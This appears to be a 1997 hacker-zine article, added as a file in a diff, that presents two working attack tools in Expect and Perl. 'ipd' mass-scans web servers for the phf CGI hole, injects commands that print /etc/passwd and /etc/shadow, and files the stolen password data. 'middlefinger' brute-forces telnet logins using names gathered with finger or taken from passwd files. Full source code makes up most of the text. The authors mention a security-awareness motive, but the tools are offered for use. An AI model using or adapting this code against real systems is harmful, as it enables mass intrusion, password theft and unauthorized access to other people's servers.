@@ -1,0 +1,711 @@
+
+             Automating brute force attacks with 'Expect"
+                           balif and desslok
+
+                             - Abstract -
+
+phf, a very fast and efficient phf scanner, and mf, a brute force login
+program. Both utilize scripts written in Expect, a scripting language
+that automates interactive programs like telnet and ftp.
+
+                              - Intro -
+
+Hacking of the past:
+
+'A young boy, with greasy blonde hair, sitting in a dark room.  The room is
+illuminated only by the luminescense of the C64's 40 character screen.
+Taking another long drag from his Benson and Hedges cigarette, the weary
+system cracker telnets to the next faceless ".mil" site on his hit list.
+"guest -- guest", "root -- root", and "system -- manager" all fail.  No
+matter.  He has all night... he pencils the host off of his list, and tiredly
+types in the next potential victim...' [1]
+
+Hacking of Today:
+
+A teenager in t-shirt and jeans types in the commands to sort the results of
+the web spider. Six thousand new hosts, not bad. Tonight will be a
+productive night. He connects to the server that will be used late into the
+night, and spawns a session well hidden from sight.  Recompiling a custom
+'ps' was quite a good idea, he thinks. The program starts. Fifty host names
+flash before his eyes. He puts on his leather jacket, slicks back his hair,
+and looks at the screen one more time.  Password files are flying by
+already. He stands there looking at the screen silently smiling, then hears
+the impatient beeping from his ride downstairs. Closing the door, he leaves
+for the party. The screen continues to scroll text...
+
+                         - Scanning the Internet -
+
+Programs like Satan are well known on the Internet. Such programs involve
+pages and pages of C code, with complicated functions and limited ability
+to be altered or customized. Massive scanning, described above, is well
+within the reach of the "average" user and it's amazingly simple. A
+working knowledge of Perl is needed. You also need to know a language
+called Expect.
+
+                            - What is Expect? -
+
+Expect is a simple scripting language that uses tcl, which is a small and
+simple language designed to be embedded in applications. Expect's main use
+is for controlling and automating the use of interactive programs like
+ftp, telnet and so forth. An understanding of how the language is
+structured and four or five keywords will let you write useful programs.
+Using the 'autoexpect' command will let you capture an entire interactive
+session, speeding development many times over (see the man page). But
+Expect can do so much more. If you wanted a program that would log you
+into an ftp server, it might look like this:
+
+#!/usr/local/bin/expect --
+spawn ftp ftp.somehost.com
+expect "ame:"
+send "anonymous\r"
+expect "assword:"
+send "me@myhost.com\r"
+expect "ftp>"
+interact
+
+This will open the ftp program to connect to ftp.somehost.com. Then it
+will wait for the appropriate strings and send the correct responses.
+'interact' is a command which turns control back to you, the user. Thus it
+will log you in, and then let you do what you like.
+
+The main reason Expect is so useful is that it can be programmed to
+respond to a variety of responses, and it can have a timeout set to only
+let a query attempt run for so long. Expect is critical for scanning. It
+would be very difficult, if not impossible, to be able to respond to the
+wide variety of responses from hosts, plus handle timeouts in just a Perl
+environment, and maintain a high level of efficiency. A quick look at
+"fetch.exp"  will show you what we mean.
+
+----------------------------------------------------------------------
+
+#!/usr/bin/expect --
+
+# Constant
+# As a default we query for the passwd file
+set pwQuery "/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd"
+
+# We get the address and port id from the command line
+set address [lindex $argv 0]
+
+if {$argc == 3} {
+   set port [lindex $argv 1]
+   set query [lindex $argv 2]
+} elseif {$argc == 2} {
+   set port [lindex $argv 1]
+   set query pwQuery
+} else {
+   set port "80"
+   set query pwQuery
+}
+set timeout 45
+
+spawn telnet $address $port
+expect {
+   timeout { puts "timed out"; exit }
+   "connection refused" exit
+   "Unknown host" exit
+   "o route to host" exit
+   "o address associated with name" exit
+   "nable to connect" exit
+   "character is"
+}
+send "GET $query\r"
+
+expect {
+   timeout { puts "timed out"; exit }
+   "html" { exit }
+   "HTML" { exit }
+   "closed by" { exit }
+}
+exit
+----------------------------------------------------------------------
+the ipd code follows:
+
+----------------------------------------------------------------------
+
+#!/usr/bin/perl
+
+# Scans web servers for bad phf executables
+
+# Constants.
+$max = 25; # how many simultaneous shells to run
+$debug = 1;
+$path = "pwds";
+$shadowpath = "$path/shadowed";
+$fh = "fh000"; # filehandle variable
+$queries = '/cgi-bin/phf?Qalias=x%0acat%20/etc/passwd%0aecho%20ImPrDr%0aid%0aecho%20ImPrDr%0auname%20-a';
+$getShadow = '/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/shadow';
+
+###
+##
+# Begin main
+
+&banner();
+
+# just to be anal
+@really_dumb_sites = ();
+$tried = $listlength = $totalgotten = $rootservers = $shadowed = 0;
+
+# Get server list.
+unless ($ARGV[0]) { die "Usage: ipd.pl <server list>\n"; }
+open(SERVERS, "$ARGV[0]") or die "Cannot read server list: $!\n";
+@servers = <SERVERS>;
+close SERVERS;
+chomp @servers;
+$listlength = @servers;
+undef $/; # we won't need this anymore
+
+# Break the list of servers into smaller arrays, set by the
+# variable $max. We want to run a certain number of simultaneous
+# shells, but we don't want to hose the connection too badly.
+
+$index = int($#servers / $max); # for stepping through @servers
+
+# main loop
+
+for ('0' .. $index) {
+   @buffer = splice(@servers, 0, $max);
+   $tried += @buffer;
+   $listlength = @servers;
+   print "probe buffer:\n@buffer\n" if $debug;
+   &probe(@buffer); # recursively query servers
+}
+
+# Finish up
+
+&try_for_shadowfile(@really_dumb_sites) if ($#really_dumb_sites > 0);
+
+print << "EOLN";
+Total servers breached:  $totalgotten
+Root servers:            $rootservers
+Shadowed password files: $shadowed
+Done. Exiting...
+
+EOLN
+
+#
+##
+### End main
+
+sub probe {
+
+   $level++;
+   my $server = shift;
+   return unless $server;
+   my $port = "";
+   my $pipe = "$server$level";
+   if ($server =~ /:/) {
+      ($server, $port) = ($`, $');
+   } else {
+      $port = "80";
+   }
+
+   open $pipe, "fetch.exp $server $port $queries|"
+      or die "Can't open pipe to fetch: $!\n";
+
+   &probe(@_); # recurse
+
+   ($lines) = <$pipe>;
+   close $pipe;
+   my $filehandle = $fh++;
+   print "$lines\n";
+
+   if ($lines =~ /root/ ) {
+
+      $totalgotten++;
+      (undef, undef, undef, undef,
+            $pwfile, $uid, $uname) = split /ImPrDr/o, $lines;
+      @passwd = split /\n|\r/, $pwfile;
+      $uid =~ s/\r|\n//gs; # Needed to preserve output
+      ($uname) = $uname =~ /(.*?)(Connection closed by|<\/PRE>)/s;
+      undef $pwfile;
+      @passwd = grep /([^:]*:){6,}/o, @passwd;
+
+      print "DEBUG $server \@passwd:\n@passwd\nUID: $uid\nUNAME: $uname\n\n" if $debug;
+
+      if (grep /root:.:/, @passwd) {
+         if ($uid =~ /root/) {
+            push (@really_dumb_sites, "$server:$port");
+            $rootservers++;
+         }
+         $pathname = "$shadowpath/$server.shpw";
+         $shadowed++;
+      } else {
+         $pathname = "$path/$server.pw";
+      }
+
+      print "\nfilename: $pathname\n" if $debug;
+      open $filehandle, ">$pathname"
+         or die "Can't write passwd file '$pathname': $!\n";
+
+      print $filehandle join("\n", @passwd);
+      close $filehandle;
+
+      open(IDLOG, ">>idlog") or die "No ID log: $!\n";
+      print IDLOG "$server $port\n$uid\n$uname\n--\n";
+   }
+
+   print "Leaving on $server\n\n" if $debug;
+   &show_status();
+
+}
+
+sub try_for_shadowfile {
+
+   my ($server, $portno) = split(/:/, shift);
+   return unless $server;
+   my $filehandle = "SHADOW$server";
+
+   print "\n\nTrying for shadow on $server\n\n";
+
+   open($filehandle, "fetch.exp $server $portno $getShadow|")
+      or warn "Cannot fetch shadow from $server: $!\n";
+
+   &try_for_shadowfile(@_);
+
+   print "\n===================try_for_shadowfile==================\n\n";
+   my @lines = <$filehandle>;
+   my @shadow = grep /[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:/o, @lines;
+   close $filehandle;
+
+   if (grep /root/, @shadow) {
+      print "\nGOT SHADOW FROM $server!!!\n\n";
+      open($filehandle, ">$shadowpath/$server.sh")
+         or die "Can't print out shadow for '$server': $!\n";
+      print $filehandle @shadow;
+      close $filehandle;
+   } else {
+      print "\nCouldn't get shadow for $server\n";
+   }
+   print "\n===================try_for_shadowfile==================\n\n";
+}
+
+sub banner {
+print << "EOLN";
+
+                           Imperial Probe Droid
+                     Copyleft (C)1997 Americrack Inc.
+                   "Your Link to Illegal Communications"
+
+EOLN
+}
+
+sub show_status {
+
+   print << "EOLN";
+   --------------- ipd ---------------
+   Tried: $tried Remaining: $listlength
+   Total servers breached: $totalgotten
+   Root servers: $rootservers
+   Shadowed password files: $shadowed
+
+EOLN
+}
+
+----------------------------------------------------------------------
+                               - Section 1. -
+                         - Putting it all together -
+                         -- Internet Probe Droid --
+
+Internet Probe Droid, or ipd, is a program that combines the efficient
+manipulation of text that Perl offers with the controlling power of
+Expect. The Perl code features a recursive subroutine, as deep as you'd
+like (or can handle), that breaks up the server list and calls the Expect
+"wrapper" to make the connection. The wrapper ensures that connections
+terminate appropriately, or times out after a specified amount of time.
+
+With the recursion, a well chosen timeout, and a decent amount of memory
+and processing power, it is possible to scan an unbelievable amount of
+hosts. Recursion is the key to speed. Scanning 30 hosts at a time, with a
+30 second timeout, you can scan approximately 3600 hosts in an hour.
+Increasing the timeout will allow for hosts that may be  lagging or have
+very large password files. Increasing the recursion depth may speed up
+scanning, but also may make your drive start to thrash and slow down the
+scan.
+
+                    - OK great. But what does it scan?? -
+
+The original purpose of ipd was to scan for phf, which is a well known
+exploit, so read an advisory if you need any more information. However, the
+basic engine can be used to scan anything! It's been rewritten to record
+Sendmail versions, attempt to get unshadowed password files from anonymous
+ftp logins, and it could even be setup to attempt to login to servers with
+default passwords... which 'middlefinger' does, exploiting finger data.
+See the next section for more on that.
+
+                     - Information about phf Scanning -
+
+ipd uses some ingenious techniques to gather as much information in as
+little time on as many hosts as possible. By having multiple "%0a"
+sequences it embeds several commands in one phf query, gathering the
+password file, the output of "id" to determine what the web server is
+running at, and the output of "uname -a" to get version information. To
+aid in splitting this information up, ipd also has the server help out a
+bit. In the phf string it includes two echoes, which the Perl program uses
+to split on.
+
+If the server does not run phf, or does not let you exploit it, then ipd
+will not do anything with the output and continue scanning. If it does,
+then it breaks up the output. Then it determines if the password file is
+shadowed or unshadowed. It saves it to the appropriate directory, thus
+sorting the results for you. Then it saves the results of "id" and "uname
+-a" to a log file, to be later reviewed by you.
+
+               - How to prepare a "hosts" file for scanning -
+
+The program "grab.pl" will search through a HTML source document and
+gather all Web URL's that it finds. You can sort and uniq this list, and
+then you are ready to go. To get documents, either do web searches for
+common words, run a web spider, or download large bookmark files.  There
+are dozens of ways of getting a large quantity of URL's.
+
+                            - How to run ipd -
+
+It couldn't be easier. Type "ipd <server list to scan>". Then let it run.
+
+                       - Problems with running ipd -
+
+Every time you make a request from a web server, it logs in it in an
+access_log. Some sites detect the phf string and log your IP, in some
+cases even claiming to automatically "mail your administrator." One site
+would go so far as to port scan you back. If you run this program, even
+from a Dynamic IP on your local machine, your administrator is bound to
+get a lot of responses from pissed off people. So it's a good idea not to,
+and study the code to learn a little bit about perl instead. <g>
+
+                             - History of ipd -
+
+V.0
+-We both came out with a simple script that would scan one host at a time.
+  One did a "lynx -dump ... > filename". Then Expect was added and fetch.exp
+  written. It would log EVERYTHING and the output would have to be searched
+  by hand. The "glue" script was named "auto.pl", but dropped and ipd was used.
+-ipd was improved to better manage and sort output, saving only useful
+ information.
+
+V.1
+-Recursion was added. This improved the script's speed a thousandfold.
+
+V.2
+-ipd would record each host that ran phf, then make one massive "id" scan on
+ them. ipd would make requests for "id" iff a server responded to the phf
+ string.
+-ipd would record each host that had a shadowed password file, and attempt
+  to get the shadow file if the server ran as root.
+-The Python phf scanner was released it 2600 Magazine. It did exactly what
+ auto.pl did two months ago. We laughed and then vowed to release ipd.
+-A little later, ipd was altered to scan and record Sendmail versions and
+  get unshadowed pw files via ftp. (Although they are very rare now a days.)
+
+V.3
+-ipd sent multiple requests in one phf query, and became even faster.
+ This reduced the code quite a bit too. "uname -a" recording was included.
+
+-ipd released!
+
+                         - Why ipd was Released -
+
+This program effectively demonstrates the power of Perl and Expect. It
+also shows just how many hosts still run an exploitable version of phf
+after more than a year of security alerts. What's even more amazing is how
+many people run phf as root. We didn't release this to be "malicious
+hackers." We hope that by having such an effective program being handed out,
+people will become more inclined to be informed about basic security
+problems.
+
+                              - ipd Usage -
+
+You need a list of web servers. ipd will read the list and query as many
+servers as you set the $depth variable in the ipd script. Try starting
+with 20 or 50. System loads of 50 are quite a site, so you may want to run
+'top' in another window to watch the load.
+
+ipd will print all activity to stdout, but it will only log id and uname
+info to a file ("idlog") and it will sort shadowed and unshadowed passwd
+files in ./pwfiles/shadowed. For more or less verbose output toggle the
+$debug variable.
+
+                              - Section 2. -
+       - middlefinger: Automating brute force login attempts -
+
+middlefinger was conceived as a way to exploit the finger command. For
+years it's been written about how finger creates a system vulnerability...
+but certainly only if one has the patience to repeatedly attempt to login
+to accounts based on what little data is gathered with finger. Who wants
+to sit for hours trying to login based on guesses? Of course when the task
+is extremely repetitive, this suggests there must be a way to automate it
+:-)
+
+Expect provides a simple way to automate the entire login attempt. Try
+reading the simple script mf uses, called "login.exp":
+
+----------------------------------------------------------------------
+
+#!/usr/bin/expect --
+
+set host [lindex $argv 0]        ;# host is taken from the command line
+set account [lindex $argv 1]     ;# ditto the account name
+set pw [lrange $argv 2 end]      ;# the rest are potential passwords
+set timeout 60
+
+foreach password $pw {
+   puts "\n\nExpect: using $account $password -----------------------------"
+   spawn telnet $host
+   expect "ogin:"
+   send "$account\r"
+   expect "assword:"
+   send "$password\r"
+   expect {
+      # we look for the "Last login" message or shell prompts
+      "ast login" {
+         puts "LOGGED INTO $host $account $password"
+         send "exit\r";
+      }
+      "#$" {
+         puts "LOGGED INTO $host $account $password"
+         send "exit\r";
+      }
+      "%$" {
+         puts "LOGGED INTO $host $account $password"
+         send "exit\r";
+      }
+      "\$$" {
+         puts "LOGGED INTO $host $account $password"
+         send "exit\r";
+      }
+      # otherwise bail out
+      "incorrect" close
+      "invalid" close
+   }
+}
+exit
+---------------------------------------------------------------------
+
+Explicit closes and exits will save system resources. With a recursive
+Perl script acting as the "glue" language, we can attempt dozens of
+simultaneous logins at once.
+
+mf is mostly a Perl script but the functionality of Expect is what makes
+the task so easy to accomplish. mf will gather loads of finger data for
+you, storing it in an array, and then use the collected data to attempt to
+login to the remote host by sheer brute force (using as many simultaneous
+login attempts as your system and network can handle, not to mention the
+remote!) A passwd file can also be used for login data. Here is "mf.pl":
+
+----------------------------------------------------------------------
+
+#!/usr/bin/perl
+
+# 'middlefinger'
+# Finger a remote host, collect accounts and names.
+# or use provided passwd file
+# Use that data to attempt to login.
+
+$max = 15;
+$host = $passwdfile = $debug = $pwlist = 0;
+&parser(); # parse command line
+die "Usage: mf.pl [-h<remote host>] [-f<passwdfile>] [-l<password list>] [-d]\n" unless $host;
+
+&banner();
+
+# Names to finger. This can obviously be expanded.
+@names = qw/mike steve michael mark tim susan cheryl laura john william
+bill jill sue chris adam kathy cathy rebecca joseph joe frank tracy tammy
+christopher alan edward shelly emily carrie terry carol caroline paul
+brian tom thomas heather becky barbara barb todd ron ronald
+david sharon harold frank benjamin jean gene lisa lee anthony/;
+
+# Collect account data
+if ($passwdfile) {
+   open FILE, "$passwdfile" or die "Can't open $passwdfile: $!\n";
+   @accountdata = <FILE>;
+   close FILE;
+
+   &refine_passwdfile_data();
+
+} else {
+   # finger the remote for info
+   foreach $name (@names) {
+      print "Trying $name...\n" if $debug;
+      open PIPE, "finger -l $name\@$host|"
+         or die "No finger $name\@$host: $!\n";
+      @accountdata = (@accountdata, <PIPE>);
+      close PIPE;
+   }
+
+   print "Refining finger data\n" if $debug;
+   &refine_finger_data();
+
+}
+
+# Break the list of accounts into smaller arrays, set by the
+# variable $max. We want to run a certain number of simultaneous
+# shells, but we don't want to max out the ports on the other end
+# or hose the connection too bad.
+
+@keys = sort keys %hash;
+$index = int($#keys / $max); # for stepping through the array @keys
+
+for ('0' .. $index) {
+   @buffer = splice(@keys, 0, $max);
+#   print "buffer: @buffer \nlength: $#keys\n";
+
+   &try_to_login(@buffer);
+}
+
+print "\nDone. Exiting...\n";
+
+###
+###  Subroutines
+###
+
+# Attempt to login with each account
+sub try_to_login {
+
+   my $account = shift;
+   return unless $account;
+   $level++;
+   my $pipe = "PIPE$level";
+
+   open $pipe, "login.exp $host $account @{$hash{$account}}|"
+      or warn "No pipe to telnet: $!\n";
+
+   &try_to_login(@_); # recurse
+
+   print "\n=====================================================\n";
+   print "Trying ACCOUNT: $account PASSWORDS: @{$hash{$account}}\n";
+   my @lines = <$pipe>;
+   close $pipe;
+   print "@lines";
+   print "\n=====\n";
+
+}
+
+# filter out potential nonpasswords
+sub pw_filter {
+   my %pws;
+   my (@list) = @_;
+   print "List: @list\n" if $debug;
+   if ($passwdfile) {
+      for (@list) {
+         unless (length($_) < 5) {
+            s/[()']//g;
+            $pws{$_}++;
+            if (length($_) == 5) { $pws{"${_}1"} = "${_}1"; }
+         }
+      }
+   } else {
+      # process finger data
+      for (@list) {
+    unless ($_ =~ /login|login:|name:|name|in|real|life/i || length($_) < 5) {
+            s/[()']//g;
+            $pws{$_}++;
+            if (length($_) == 5) { $pws{"${_}1"} = "${_}1"; }
+         }
+      }
+   }
+   print "returning ", join(' ', keys %pws), "\n" if $debug;
+   return keys %pws;
+}
+
+# parse the command line
+sub parser {
+   for (@ARGV) {
+      /^-h/ && do { $host = $';   next; };
+      /^-f/ && do { $passwdfile = $'; next; };
+      /^-d/ && do { $debug = 1;   next; };
+      /^-l/ && do { $pwlist = $'; next; };
+   }
+}
+
+# Refine finger data
+sub refine_finger_data {
+
+   @logins = grep /Login/, @accountdata;
+   chomp @logins;
+   # Dumb kludge. "@logins = grep /[^?]$/, @logins;" doesn't work.
+   for (@logins) {
+      /.$/;
+      if ($& eq '?') { undef $_; }
+   }
+
+   print "filtered logins:\n", join("\n", @logins);
+
+   $results = @logins;
+   die "Insufficient account data\n" unless $results;
+
+   # Store login data into data structure
+   for (@logins) {
+      tr/[A-Z]/[a-z]/;
+      s/(\s)+/ /g;
+      print "\n\nDespaced: $_\n" if $debug;
+      @a = split(/ /);
+      print "pw_filter: ", join(' ', &pw_filter(@a)), "\n" if $debug;
+      # toggle this depending on finger's output
+      $login = $a[2]; #                                  <----- TOGGLE!
+      $hash{$login} = [ &pw_filter(@a) ];
+      print "Data: account-> $login, pws-> @{$hash{$login}}\n\n" if $debug;
+   }
+
+}
+
+sub refine_passwdfile_data {
+   for (@accountdata) {
+      @fields = split(/:/);
+      @namedata = split(/,/, $fields[4]);
+      print "pwdata: $fields[0] $namedata[0]\n" if $debug;
+      $login = $fields[0];
+      $namedata[0] =~ tr/A-Z/a-z/;
+      @a = split(/ /, $namedata[0]);
+      print "pw_filter: ", join(' ', &pw_filter(@a)), "\n" if $debug;
+      $hash{$login} = [ &pw_filter($login, @a) ];
+      print "Data: account-> $login, pws-> @{$hash{$login}}\n\n" if $debug;
+   }
+}
+
+sub banner {
+print << "EOLN";
+
+                               Middle Finger
+                     Copyleft (C)1997 Americrack Inc.
+                   "Your Link to Illegal Communications"
+
+EOLN
+}
+
+----------------------------------------------------------------------
+
+An important tweak you will have to make if you use 'finger' data:  finger
+output is different under the various versions and proprietary copies.
+Look for the line in the Perl script that indicates where to set the index
+numbers.  For example:
+
+Login: luser                            Name: Joe Blow
+Directory: /home/timski                 Shell: /bin/bash
+Never logged in.
+New mail received Wed Jun  4 15:41 1997 (EDT)
+     Unread since Tue Mar 18 22:36 1997 (EDT)
+No Plan.
+
+The index here would be 1 for the account name. mf will use the name data
+to generate simple passwords and the rest will be discarded.
+
+middlefinger proved to be effective on its very first test run, which was
+both amazing and disturbing. Not allowing fingers to your host machines
+would indeed be a very good idea.
+
+Later it was decided to add the capability to parse passwd files and use
+that data to attempt a brute force login to a system, which also proved
+very effective. Shadowed passwd files make a good source, an abundance of
+which you can collect with ipd. Unlike ipd, mf does not sort its output
+very well, which we leave as an excercise to the reader :-) It is easy to
+cook up a Perl script to reduce the output (which you can capture with
+'script', for example).
+
+Expect can be used to write a simple wardialer as well. There seems to be
+little Expect cannot automate. It is an indispensable system
+administration tool.
+
+[1] Quote from Improving the Security of Your Site by Breaking Into it by
+    Dan Farmer, Wietse Venema
+
